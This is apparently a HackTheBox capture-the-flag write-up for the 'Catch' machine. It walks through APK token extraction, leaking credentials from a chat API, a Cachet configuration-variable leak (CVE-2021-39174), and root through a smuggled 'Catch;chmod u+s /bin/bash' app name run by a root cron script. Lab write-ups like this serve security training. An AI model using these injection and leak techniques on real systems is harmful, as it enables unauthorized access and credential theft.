---
description: Catch box from HackTheBox write up.
---

# Catch

## Nmap scan

As always a basic full port scan followed by a more detailed one of the open ports:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 10.10.11.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:57 EDT
Nmap scan report for 10.10.11.150
Host is up (0.057s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,3000,5000,8000 -sC -sV 10.10.11.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 07:59 EDT
Nmap scan report for 10.10.11.150
Host is up (0.058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=dc1f63d531e6bb29; Path=/; HttpOnly
|     Set-Cookie: _csrf=zOsNQVYrG-dW_xmT_61Rbb52Rk86MTY1MzczOTE2MzMzMjg1NDI0Nw; Path=/; Expires=Sun, 29 May 2022 11:59:23 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 28 May 2022 11:59:23 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Catch Repositories </title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=50ba29214c8efe8a; Path=/; HttpOnly
|     Set-Cookie: _csrf=7ncKrYlCix8LzYmNrgSbZOGBG9o6MTY1MzczOTE2ODY4MTE4OTAwOQ; Path=/; Expires=Sun, 29 May 2022 11:59:28 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 28 May 2022 11:59:28 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3ArAhYISOfSycRtXXcLkE076Nl3IxV2VTK.5N2ujOCd1eowvNHpT3UQ092ovNFzOOPCNlGrJlhHrO4; Path=/; HttpOnly
|     Date: Sat, 28 May 2022 11:59:28 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3A6AA6bymAmMLNna6EYRKbWFqnMLzxhZ1n.oO7hR8xgJuWTWkFrTeGrzVkLz2PlomVDrsyS4C8KJV0; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Sat, 28 May 2022 11:59:28 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.06 seconds
```

Looks like Nmap was not able to report some of the ports services properly so, since everything but the port 22 seems like HTTP services I checked all of them:

- **Port 22:** SSH, this is the obvious one
- **Port 80:** Catch webpage.
- **Port 3000:** Catch repositories.
- **Port 5000:** Let's Chat page.
- **Port 8000:** Catch status page.

## Catch Webpage

This site is pretty empty, I even tried to launch a Gobuster scan but couldn't really find anything. The only thing here is that we can download what looks like the status page app for Android, I will decode the APK file and inspect the code later to see if there is something interesting.


## Catch Repositories

Here we have what looks like a self hosted Git service called [Gitea](https://github.com/go-gitea/gitea){:target="_blank"}. The version is 1.14.1 and it has no public repositories but I found that the user `root` exists, maybe we can try to bruteforce or wait until we find some credentials.

## Let's Chat

This is a (Let's Chat)[https://github.com/sdelements/lets-chat] application, I have no credentials to try here so I guess we finished before starting.

## Catch Status Page

This is a [Cachet](https://github.com/CachetHQ/Cachet){:target="_blank"} application, and it is used to show the status of services. According to the documentation there is a login page: `/auth/login`, in order to find the credentials we could try to decode the APK file we got before (Remember that should be this same page but for Android) and inspect it a bit:

```bash
apktool d catchv1.0.apk
```

After looking around for a bit I found these tokens under `res/values/strings.xml`:

```xml
res/values/strings.xml

<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
<string name="slack_token">xoxp-23984754863-2348975623103</string>
<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
```

### Leaking credentials from Let's Chat

I tried both the Slack and Gitea tokens but looks like they are not valid. Luckily, the Let's Chat token worked! And now we can access the app API:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X 'GET' \
  'http://gitea.catch.htb:5000/rooms' \
  -H 'accept: application/json' -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]
```

After inspecting the different chats I found credentials for the Status page!

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X 'GET' \
  'http://gitea.catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages' \
  -H 'accept: application/json' -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq
[
  ...
  {
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  ...
]
```

### Getting user access

Using `john:E}V!mywu_69T4C}W` as credentials in the Cached dashboard gives us access to it. Once in here I really had a hard time figuring out what to do next, I found [this](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/){:target="_blank"} blog where they show 3 different CVEs for Cachet `2.4.0-dev`. In theory all of them can be used but the RCE one (The more interesting of them of course) is pretty tricky so I tried the CVE-2021-39174.

This vulnerability tale advantage of the fact that the application uses `vlucas/phpdotenv` for the configuration files and it support nested variables. The problem with this is that any user with access to the dashboard can leak configuration variables, it just need to go to the mail settings and change the `Mail From Address` field from `notify@10.129.136.74` to, for example, `notify.{DB_PASSWORD}.@10.129.136.74`. When the page is reloaded, the application will load the variable value and leak the information. Checking the documentation I leaked `DB_PASSWORD` and `DB_USERNAME`: `will:s2#4Fg0_%3!`.

I decided to try this credentials in the other services and imagine my surprise when I got SSH access, we are in!

## In the machine as will

You can get the user flag under `/home/will/user.txt`. After that, I found something interesting: `/opt/mdm/verify.sh`. Looks like this is running as a cronjob or something by `root` and it is checking `.apk` files under `/opt/mdm/apk_bin/` to see if they are valid Catch applications.

Since we already have an APK that should be valid, the one we downloaded at the beginning, we can upload it to the machine and see what happens with it. After a minute or so, the APK file I put in the path checked by the script was deleted. Checking the script, that is actually the last step so we are now sure about the cronjob theory.

## Getting root

Inside the script I noticed this function:

```bash
####################
# Basic App Checks #
####################

app_check() {
	APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
	echo $APP_NAME
	if [[ $APP_NAME == *"Catch"* ]]; then
		echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
		mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
	else
		echo "[!] App doesn't belong to Catch Global"
		cleanup
		exit
	fi
}
```

It is using `xargs` to generate a command that will create directory with a name of the application. The name of the application is obtained, after decompiling the APK, from a file called `strings.xml`. This is actually the file where we found the application tokens earlier.

Since we can edit this file, it is possible to change the variable name the script is using and inject a command that will be run by `root`:

```xml
	...
	<string name="abc_toolbar_collapse_description">Collapse</string>
    <string name="app_name">Catch;chmod u+s /bin/bash</string>
    <string name="appbar_scrolling_view_behavior">
    ...
```

In this case, the idea is that the `bash` binary will be turned into a SUID binary to allow us to get `root` access easily. Just recompile the new APK with `apktool b catchv1.0` and upload the application to the `/opt/mdm/apk_bin/` folder in the target.

After waiting a bit, the APK file gets removed and...

```bash
will@catch:~$ bash -p
bash-5.0#
```

We have rooted it! Get the flag under `/root/root.txt`.
